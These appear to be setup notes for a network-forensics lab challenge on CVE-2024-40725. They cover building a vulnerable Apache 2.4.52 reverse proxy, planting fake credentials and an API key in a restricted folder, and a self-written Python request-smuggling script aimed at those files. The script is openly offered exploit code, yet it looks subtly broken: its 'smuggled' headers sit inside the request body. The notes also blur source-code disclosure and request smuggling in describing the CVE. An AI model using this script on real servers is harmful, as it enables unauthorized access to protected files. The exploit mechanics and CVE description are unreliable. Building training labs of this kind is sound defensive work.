CVE-2024-40725

https://nvd.nist.gov/vuln/detail/cve-2024-40725

A suitable choice is CVE-2024-40725, a vulnerability in the Apache HTTP Server that allows for source code disclosure of local scripts running on the server. A public PoC exploit is available for this CVE, making it feasible to replicate in a controlled environment

 CVE-2024-40725 is dependent on the ProxyPass directive being configured in Apache’s mod_proxy module.

HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.

CVE-2024-40725 allows an attacker to manipulate HTTP requests in a way that tricks Apache’s mod_proxy into misinterpreting them, leading to unauthorized access, information leakage, or further attacks.

How it Works (Simplified Explanation)
Apache mod_proxy is used to forward HTTP requests from users to backend servers.
If ProxyPass and rewrite rules are misconfigured, Apache interprets HTTP headers incorrectly.
Attackers send crafted HTTP requests that the proxy and backend server interpret differently.
This discrepancy allows attackers to sneak in extra requests (request smuggling) or bypass security controls.
The smuggled request can then:
Access internal files (like passwords or API keys).
Modify user sessions (session hijacking).
Bypass authentication or WAF rules.


Review the PCAP File: Use Wireshark to analyze the captured traffic, identifying key indicators of the exploit attempt and any responses from the target system.

Prepare the Sherlock Write-up: Document the following:
Scenario Description: Outline the context and objectives of the investigation.
Artifacts Provided: List the PCAP file and any other relevant artifacts, including their file hashes for integrity verification.
Initial Analysis: Describe the steps taken to analyze the PCAP file, such as filtering for specific IP addresses or protocols.
Detailed Analysis: Provide a step-by-step walkthrough of how the exploit was identified within the network traffic, including screenshots from Wireshark highlighting critical packets.
Questions and Answers: Develop questions that guide the investigator through the analysis process, along with detailed answers.

Attacker: Kali Linux

Setup for attacker:



Victim: Ubuntu Desktop 24.04.1



Setup for victim:

sudo apt update
sudo apt install -y build-essential libpcre3 libpcre3-dev zlib1g-dev libssl-dev
sudo wget https://archive.apache.org/dist/httpd/httpd-2.4.52.tar.gz 
sudo tar -xvzf httpd-2.4.52.tar.gz
cd httpd-2.4.52
sudo apt update
sudo apt install libapr1-dev libaprutil1-dev
sudo ./configure --enable-so --enable-ssl --enable-cgi --enable-rewrite 
sudo make -j$(nproc)
sudo make install

Sudo /usr/local/apache2/bin/apachectl start

-Make sure to change the config to allow ServerName to be the victim’s IP and add this:]

Listen 8080

LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so

<VirtualHost *:80>
    ServerName 10.0.2.4

    # Enable ProxyPass to forward requests to a backend server 
    ProxyRequests Off
    ProxyPass / http://127.0.0.1:8080/
    ProxyPassReverse / http://127.0.0.1:8080/
    Alias /restricted “/usr/local/apache2/htdocs/restricted”

#Rejects all direct access to our /restricted directory on :80
<Directory “/usr/local/apache2/htdocs/restricted”>
    Require all denied
</Directory>
    <Proxy *>
        Order deny,allow
        Allow from all
    </Proxy>

    ErrorLog logs/proxy_error.log
    CustomLog logs/proxy_access.log combined
</VirtualHost>

<VirtualHost *:8080>
#Host the files here
      DocumentRoot “/usr/local/apache2/htdocs”
#Rejects all direct access to our /restricted directory on :8080
      <Directory “/usr/local/apache2/htdocs”>
           Require all granted
     </Directory>
</VirtualHost>

Also restart the service to enact the changes. 




Fluff up the apache server to make it better:

sudo mkdir -p /usr/local/apache2/htdocs/restricted
sudo chmod 755 /usr/local/apache2/htdocs/restricted

echo "admin:SuperHeemMan79!" | sudo tee /usr/local/apache2/htdocs/restricted/users.txt

echo '{"API_KEY": "openalien-chatzpt-maxplan-5654"}' | sudo tee /usr/local/apache2/htdocs/restricted/secrets.json

<Directory "/usr/local/apache2/htdocs/restricted">
    Require all denied
</Directory>

-Restrict all access to that directryu

-Make sure if you are adding any files into the restricted directory on htdocs, it is readable by apache web service using chmod


Confirm via Kali:
┌──(kali㉿kali)-[~]
└─$ curl http://10.0.2.4
<html><body><h1>It works!</h1></body></html>



└─$ curl -v http://10.0.2.4/.htaccess
*   Trying 10.0.2.4:80...
* Connected to 10.0.2.4 (10.0.2.4) port 80
> GET /.htaccess HTTP/1.1
> Host: 10.0.2.4
> User-Agent: curl/8.7.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 403 Forbidden
< Date: Sun, 02 Feb 2025 00:13:05 GMT
< Server: Apache/2.4.52 (Unix)
< Content-Length: 199
< Content-Type: text/html; charset=iso-8859-1
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
</body></html>
* Connection #0 to host 10.0.2.4 left intact
                                                    

POC:
https://github.com/TAM-K592/CVE-2024-40725-CVE-2024-40898/blob/ALOK/CVE-2024-40725.py  

Revised POC, written by me:
-The PoC exploits a parsing discrepancy between Apache’s frontend proxy and its backend server. It sends a POST request with Transfer-Encoding: chunked that actually contains a hidden GET request to /restricted/users.txt.

import requests
import argparse

def exploit_http_request_smuggling(target_url):
    """
    Exploits CVE-2024-40725 (HTTP Request Smuggling) to retrieve restricted files.
    """

    smuggled_request = (
        "POST / HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Content-Length: 0\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n\r\n"
        "GET /restricted/users.txt HTTP/1.1\r\n"
        "Host: {}\r\n"
        "User-Agent: smuggle-test\r\n"
        "\r\n"
    ).format(target_url, target_url)

    try:
        response = requests.post(target_url, data=smuggled_request, headers={'Content-Type': 'text/plain'}, timeout=10)
        
        print(f"\n[+] Status Code: {response.status_code}")
        print(f"[+] Response Headers:\n{response.headers}")
        print(f"[+] Response Body:\n{response.text}")

        if response.status_code == 200:
            print(f"[+] SUCCESS! Retrieved restricted file from {target_url}")
        else:
            print(f"[-] Target {target_url} does not appear to be vulnerable.")
    except Exception as e:
        print(f"[ERROR] Exploit failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Exploit CVE-2024-40725 (HTTP Request Smuggling)')
    parser.add_argument('-u', '--url', required=True, help='Target Apache Server URL')
    args = parser.parse_args()
    exploit_http_request_smuggling(args.url)



Process:

Requests to http://10.0.2.4/restricted/ are forwarded to the backend (127.0.0.1:8080).

The backend serves files from /usr/local/apache2/htdocs/restricted/.


